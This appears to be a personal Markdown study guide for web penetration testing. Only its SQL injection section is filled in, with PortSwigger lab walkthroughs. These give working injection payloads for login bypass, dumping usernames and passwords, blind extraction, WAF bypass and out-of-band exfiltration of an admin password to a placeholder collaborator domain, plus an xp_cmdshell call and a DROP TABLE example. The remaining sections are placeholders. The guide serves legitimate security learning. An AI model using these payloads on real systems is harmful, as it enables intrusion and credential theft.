# Preliminary
[Github Basic writing and formatting syntax](https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax)

# Web Penetration Testing Learning path
1. [TryhackMe - Web Fundamentals](https://tryhackme.com/path/outline/web)  
1. [PortSwigger - Web Security Academy](https://portswigger.net/web-security/all-topics)  
1. [iNE - eWPT Web Application Penetration Tester](https://security.ine.com/certifications/ewpt-certification/)

# Table of Contents
**Server-side topics (13)**
- [SQL Injection](#sql-injection)
  - [Lab](#lab)
- [Path Traversal](#path-traversal)
- [Authentication](#authentication)
- [Business Logic Vulnerabilities](#business-logic-vulnerabilities)
- [Command Injection](#command-injection)
- [Information Disclosure](#information-disclosure)
- [Access Control](#access-control)
- [File Upload](#file-upload)
- [Race Condition](#race-condition)
- [SSRF (Server-Side Request Forgery)](#ssrf-server-side-request-forgery)
- [NoSQL Injection](#nosql-injection)
- [XXE Injection](#xxe-injection)
- [API](#api)

**Client-side topics (6)**
- [CSRF (Cross-Site Request Forgery)](#csrf-cross-site-request-forgery)
- [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
- [CORS (Cross-Origin Resource Sharing)](#cors-cross-origin-resource-sharing)
- [Clickjacking](#clickjacking)
- [DOM-based Attacks](#dom-based-attacks)
- [WebSockets](#websockets)

**Advanced topics (11)**
- [Insecure Deserialization](#insecure-deserialization)
- [Web LLM Attacks](#web-llm-attacks)
- [GraphQL API](#graphql-api)
- [Server-side Template Injection](#server-side-template-injection)
- [Web Cache Poisoning](#web-cache-poisoning)
- [HTTP Host Header](#http-host-header)
- [OAuth Authentication](#oauth-authentication)
- [JWT Attacks](#jwt-attacks)
- [Prototype Pollution](#prototype-pollution)
- [Essential Skills](#essential-skills)

**Burp extension**  
- Hackvertor: Encoding and Decoding, data transformation (hashing, encryption, decryptin, convert, string)
- ddd
  
## SQL Injection
**How to detect**     
- single quote ' and look for errors or other anomalies
- Boolean condition `OR 1=1` and `OR 1=2`
- time delays

**Basic SQL**  
- `' OR 1=1 --`

**In-band: Error-Based Injection**  
- `'; SELECT 1/0 --`

**In-band: Union-Based Injection**  
- Determine the number of columns required: `' ORDER BY 1--`  OR `' UNION SELECT NULL,NULL--`
- Oracle specific syntaxt: `' UNION SELECT NULL FROM DUAL--`
- Retrieve othe records: `' UNION SELECT 1, username, password FROM users --`

**Blind: Boolean-based Injection**  
- `' AND '1'='1` (Return results)
- `' AND '1'='2` (No results)
- `' AND SUBSTRING(@@version, 1, 1)='M'` (Check if the first character is 'M')
- Automate the payload (Burpsuite Intruder)

**Blind: Time-Base Injection**  
- `'; WAITFOR DELAY '0:0:10' --`

**Out-of-Band (OOB) Injection**  
- `'; EXEC xp_cmdshell('nslookup yourdomain.com') --`

**Second order/Stored Injection**  
- username: `attacker'--`: unauthorized access
- `INSERT INTO users (username, password) VALUES ('attacker'--', 'password123');`
- username: `JohnDoe'); DROP TABLE users;--`: delete table
- `INSERT INTO users (username, password) VALUES ('JohnDoe'); DROP TABLE users;--', 'password123');`  

**Examine the specific database**  
- DB version: Microsoft, MySQL: @@version； PostgreSQL： version()；Oracle: SELECT banner FROM **v$version**
- Comment: Others: --, /* */; MySQL: #
- **All DB except Oracle**: SELECT TABLE_NAME FROM information_schema.tables, SELECT * FROM information_schema.columns WHERE TABLE_NAME = 'Users'
- **Oracle**: SELECT * FROM all_tables, SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
- Oracle built-in table: ' UNION SELECT NULL FROM **DUAL**--
- String concatenation: PostgreSQL, Oracle ||, Microsoft +, MySQL <SPACE>
- Substring: Others: SUBSTRING('footbar', 4, 2); Oracle: SUBSTR('footbar', 4, 2)
- [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Lab
1. SQL injection vulnerability in WHERE clause allowing **retrieval of hidden data**
   - GET /filter?category=`' OR 1=1 --`
   - Verify that the response now contains one or more unreleased products
2. SQL injection vulnerability allowing **login bypass**
   - POST /login
   - modify the body parameter username=`administrator'--`&password=password
5. SQL injection **UNION** attack, determining the **number of columns** returned by the query
   - GET /filter?category=`' UNION SELECT NULL,NULL,NULL--`
7. SQL injection UNION attack, **finding** a **column** containing **text**
   - GET /filter?category=`' UNION SELECT NULL,'abc',NULL--`
9. SQL injection UNION attack, **retrieving data** from other tables
    - GET /filter?category=`' UNION SELECT username, password FROM users--`
11. SQL injection attack, querying the **database type and version on Oracle**
    - GET /filter?category=`' UNION SELECT BANNER, NULL FROM v$version--`
13. SQL injection attack, querying the **database type and version on MySQL and Microsoft**
    - GET /filter?category=`' UNION SELECT @@version,'def'#`
15. SQL injection attack, **listing the database contents on non-Oracle databases**
    - tables: `' UNION SELECT table_name, NULL FROM information_schema.tables--`
    - columns: `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--`
    - records: `' UNION SELECT username, password FROM users--`
17. SQL injection attack, **listing the database contents on Oracle**
    - tables: `' UNION SELECT table_name,NULL FROM all_tables--`
    - columns: `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--`
    - records: `' UNION SELECT USERNAME, PASSWORD FROM USERS--`
19. SQL injection UNION attack, **retrieving multiple values in a single column**
    - `' UNION SELECT NULL,username||'~'||password FROM users--`
21. **Blind SQL injection** with **conditional responses**
    - Check response  
      Cookie: TrackingId=ZZZ`' AND '1'='1`  (Welcome back)  
      Cookie: TrackingId=ZZZ`' AND '1'='2`  (No record)  
    - confirm table name: `' AND (SELECT 'a' FROM users LIMIT 1)='a`
    - confirm user name: `' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
    - confirm length of password (Burp intruder: Sniper) 
      Cookie: TrackingId=ZZZ`' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=§1§)='a;`  
      **Position**:§1§; **Paylaods**: Numbers; From 1 to 20; **Settings**>Grep - Match: Welcome back --> Start Attack  
    - enumerate password (Burp intruder: cluster bomb)  
      Cookie: TrackingId=ZZZ`' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§`  
      **Position**:§1§,§a§; **Paylaods**: payload 1: numbers; payload 2: brute forcer a-z,0-9
    - Automation [Python script](https://github.com/sandunigfdo/Web-Security-Academy-Series/blob/2be2887b7a2818dd6e7d5f0ed1ac6b01fcfcac28/SQL%20injection/sqli-Lab11.py)  
      py sqli-Lab11.py [https://xxx.web-security-academy.net/]  
      [+] Retrieving administrator password.... rvxvtobfe7e_____
23. **Blind SQL injection** with **conditional errors**
    - Check response  
      Cookie: TrackingId=ZZZ`'` (Error)  
      Cookie: TrackingId=ZZZ`''` (No Error)  
    - confirm table name: TrackingId=ZZZ`'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
    - confirm user name: TrackingId=ZZZ`'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    - confirm length of password (Burp intruder: Sniper)  
      TrackingId=ZZZ`'||(SELECT CASE WHEN LENGTH(password)=§1§ THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
       **Position**:§1§; **Paylaods**: Numbers; From 1 to 20;-->Start Attack-->Find 500 response code  
    - enumerate password (Burp intruder: cluster bomb)  
      TrackingId=ZZZ`'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
      **Position**:§1§,§a§; **Paylaods**: payload 1: numbers; payload 2: brute forcer a-z,0-9-->Start Attack-->Find 500 response code
25. Visible **error-based** SQL injection
    - Single quote to output verbose error message  
      Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'vwGUdLnAnuxjsJBf''. Expected  char
    - `' AND CAST((SELECT 1) AS int)--`  
      ERROR: argument of AND must be type boolean, not type integer Position: 63
    - `' AND 1=CAST((SELECT 1) AS int)--`  
      No error  
    - `' AND 1=CAST((SELECT username FROM users) AS int)--`  
      Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'vwGUdLnAnuxjsJBf' AND 1=CAST((SELECT username FROM users) AS'. **Expected  char**
    - Delete cookie value to free up some additional characters. Resend the request  
      ERROR: **more than one row** returned by a subquery used as an expression  
    - `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`  
      ERROR: invalid input syntax for type integer: "**administrator**"  (leaks the first username)
    - `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`  
      ERROR: invalid input syntax for type integer: "**41nsvq98jt6vtegvlafu**"
27. Blind SQL injection with **time delays**
    - `'||pg_sleep(10)--`
29. Blind SQL injection with **time delays** and **information retrieval**
    - Note: URL encode key character ';' = '%3B'
    - Test true condition time delay  
      `'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(3) END--`
    - Test false condition and no time delay  
      `%3BSELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(3) END--`
    - Verify username is 'administrator'. Condition is true, time delay  
      `'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--`
    - Retrieve password length (Burp Intruder: Sniper)-->**Click columns-->Response Received**-->To monitor time response  
      `'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)=§1§) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--`
    - Extract a single character from the password (Burp Intruder:Cluster Bomb)-->Resource Pool-->Max 1 concurrent request
      `'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users--`
31. Blind SQL injection with **out-of-band** interaction
    - Perform a DNS lookup to an external domain. Use Burp Collaborator client to generate a unique Burp Collaborator subdomain, and then poll the collaborator server to confirm that a [DNS lookup](https://portswigger.net/web-security/sql-injection/cheat-sheet#DNS%20lookup) occurred.
    - Click Burp Menu-->**Burp Collaborator Client**-->Button 'Copy to clipboard'
    - `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
    - Convert payload to URL encode format then send request
    - Click Button '**Poll now**'  
33. Blind SQL injection with **out-of-band data exfiltration**
    - `EXTRACTVALUE` is an Oracle SQL function that retrieves the value of a specified XML element.
    - `xmltype(...)` creates an XMLType from the given string.
    - `<?xml version="1.0" encoding="UTF-8"?>` is XML declaration.
    - `<!DOCTYPE root [ ... ]>` defines a Document Type Definition (DTD) for the XML.
    - `<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">` defines an external entity %remote that fetches content from a remote URL. The URL is dynamically constructed by concatenating a static string ("http://) with the result of a subquery (SELECT password FROM users WHERE username='administrator') and a static string ('.BURP-COLLABORATOR-SUBDOMAIN/").
    - `%remote;` This entity reference is used to include the content fetched from the remote URL into the XML document.
    - `FROM dual` is a dummy table used in Oracle databases when a table reference is required but no actual table is necessary.
    - `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
    - In burp colloborator, click button 'Poll now'. Read the description: The Collaborator server received a DNS lookup of type AAAA for the domain name **7rma86kuw6xbyvgxltiy**.7169ftyykb10b1kwbjhbipnfz65wtl.oastify.com  
35. SQL injection with **filter bypass** via **XML encoding**
    - Search for **XML body parameter** `<storeId>1</storeId>`
    - Install Burp extensions:**Hackvertor**
    - `<storeId>1 UNION SELECT NULL</storeId>` **WAF detected**
    - Highlight your input, right=click, then select Extensions > Hackvertor > Encode > **hex_entities**
      `<@hex_entities>1 UNION SELECT NULL<@/hex_entities>`
    - **Concatenate** the returned usernames and password: administrator~seqzzom9u0zc7ixuy3cg  
      `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`

## Path Traversal
Content for Path Traversal...

## Authentication
Content for Authentication...

## Business Logic Vulnerabilities
Content for Business Logic Vulnerabilities...

## Command Injection
Content for Command Injection...

## Information Disclosure
Content for Information Disclosure...

## Access Control
Content for Access Control...

## File Upload
Content for File Upload...

## Race Condition
Content for Race Condition...

## SSRF (Server-Side Request Forgery)
Content for SSRF...

## NoSQL Injection
Content for NoSQL Injection...

## XXE Injection
Content for XXE Injection...

## API
Content for API...

## CSRF (Cross-Site Request Forgery)
Details about CSRF...

## XSS (Cross-Site Scripting)
Details about XSS...

## CORS (Cross-Origin Resource Sharing)
Details about CORS...

## Clickjacking
Details about Clickjacking...

## DOM-based Attacks
Details about DOM-based attacks...

## WebSockets
Details about WebSockets...

## Insecure Deserialization
Content for Insecure Deserialization...

## Web LLM Attacks
Content for Web LLM Attacks...

## GraphQL API
Content for GraphQL API...

## Server-side Template Injection
Content for Server-side Template Injection...

## Web Cache Poisoning
Content for Web Cache Poisoning...

## HTTP Host Header
Content for HTTP Host Header...

## OAuth Authentication
Content for OAuth Authentication...

## JWT Attacks
Content for JWT Attacks...

## Prototype Pollution
Content for Prototype Pollution...

## Essential Skills
Content for Essential Skills...
